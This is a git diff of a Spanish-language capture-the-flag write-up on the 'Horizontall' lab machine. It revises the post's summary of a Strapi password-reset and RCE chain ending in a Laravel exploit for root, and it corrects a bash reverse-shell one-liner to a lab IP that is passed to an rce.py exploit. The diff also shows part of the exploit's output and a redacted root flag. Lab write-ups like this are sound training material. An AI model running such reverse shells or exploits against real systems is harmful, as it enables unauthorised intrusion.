@@ -4,7 +4,7 @@ date: '2022-02-09'
 tags: ["CTF", "Hacking", "VueJS", "Fuzzing", "Rce", "#Import 2022-12-20 21:06"]
 draft: false
 authors: ['default']
-summary: 'En este CTF nos enfrentamos a una máquina horizontall.htb. Comienzo realizando un escaneo de puertos con NMAP y descubro que los puertos 80 y 22 están abiertos. Al abrir el sitio web en el puerto 80, noto que se trata de una SPA en VueJS. Utilizando el devtools de Firefox, encuentro los archivos Vue que llaman a la API para obtener información. Descubro un subdominio interesante y lo añado a mi /etc/hosts para resolver la dirección. Realizo fuzzing contra este subdominio y encuentro una ruta /admin que contiene un formulario de login de la plataforma Strapi. Mediante una vulnerabilidad de reseteo de contraseña, logro obtener acceso al usuario admin. Aprovechando una vulnerabilidad de ejecución remota de código en Strapi CMS, consigo una reverse shell y escalo privilegios. Exploro el localhost y descubro que hay un servicio oculto en el puerto 8000. Utilizando un exploit de Laravel, me conecto a este servicio y obtengo una shell como usuario root. Encuentro el archivo root.txt y finalizo el reto.'
+summary: 'En este reto CTF se escanean todos los puertos disponibles con NMAP y se encuentran los puertos 80 y 22 abiertos. Al acceder a una URL, se descubre una SPA de VueJS. Mediante el uso de herramientas de desarrollo, se encuentran archivos Vue que llaman a una API. Se descubre un subdominio interesante y se realiza fuzzing contra él. Se encuentra una ruta de administración de Strapi y se explota una vulnerabilidad para resetear la contraseña de un usuario válido. Se ejecuta un script de RCE y se obtiene una reverse shell. Se escala privilegios en la máquina y se encuentra un puerto oculto en el localhost. Se utiliza un exploit de Laravel para obtener una reverse shell como usuario root. Se obtiene la flag del sistema.'
 images: ["/static/images/uploads/ctf-horizontall/Screenshot_1-1.webp", "/static/images/uploads/ctf-horizontall/image.webp", "/static/images/uploads/ctf-horizontall/Screenshot_2-1.webp", "/static/images/uploads/ctf-horizontall/image-3.webp", "/static/images/uploads/ctf-horizontall/image-5.webp", "/static/images/uploads/ctf-horizontall/image-6.webp"]
 ---
 
@@ -95,7 +95,7 @@ python3 rce.py http://api-prod.horizontall.htb
 [+] Seems like the exploit will work!!!
 [+] Executing exploit
 
-$ bash -c 'bash -i & /dev/tcp/10.10.14.15/443 0&1'
+$ bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'
 ```
 De esta manera, en la consola de netcat, recibimos una reverse shell con la que podemos empezar a escalar privilegios.
 
@@ -154,5 +154,4 @@ connect to [10.10.14.15] from horizontall.htb [10.10.11.105] 38560
 root
 # cat /root/root.txt
 7360xxxxxxxxxxxxxxxxxxx
-
 ```
